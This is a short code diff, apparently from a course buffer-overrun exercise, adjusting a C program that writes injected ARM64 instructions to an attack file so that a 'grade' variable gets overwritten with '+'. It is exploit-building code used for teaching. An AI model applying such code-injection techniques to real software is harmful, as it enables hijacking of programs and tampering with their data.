@@ -34,7 +34,7 @@ int main(void){
    fwrite(&ulInstruction, sizeof(unsigned int), 1, psFile);
 
    /* bl printf     */
-   ulInstruction = MiniAssembler_mov(0, 65);
+   ulInstruction = MiniAssembler_b(0x400690, pAAttack + 4);
    fwrite(&ulInstruction, sizeof(unsigned int), 1, psFile);
 
    /* mov w0, '+'   */
@@ -42,7 +42,7 @@ int main(void){
    fwrite(&ulInstruction, sizeof(unsigned int), 1, psFile);
 
    /* adr x1, grade */
-   ulInstruction = MiniAssembler_adr(1, 0x420044, pAAttack + 4);
+   ulInstruction = MiniAssembler_adr(1, 0x420044, pAAttack + 12);
    fwrite(&ulInstruction, sizeof(unsigned int), 1, psFile);
 
    /* strb wo, [x1] */
@@ -50,7 +50,7 @@ int main(void){
    fwrite(&ulInstruction, sizeof(unsigned int), 1, psFile);
 
    /* b  printf     */
-   ulInstruction = MiniAssembler_b(0x40089c, pAAttack + 12);
+   ulInstruction = MiniAssembler_b(0x40089c, pAAttack + 20);
    fwrite(&ulInstruction, sizeof(unsigned int), 1, psFile);
 
 
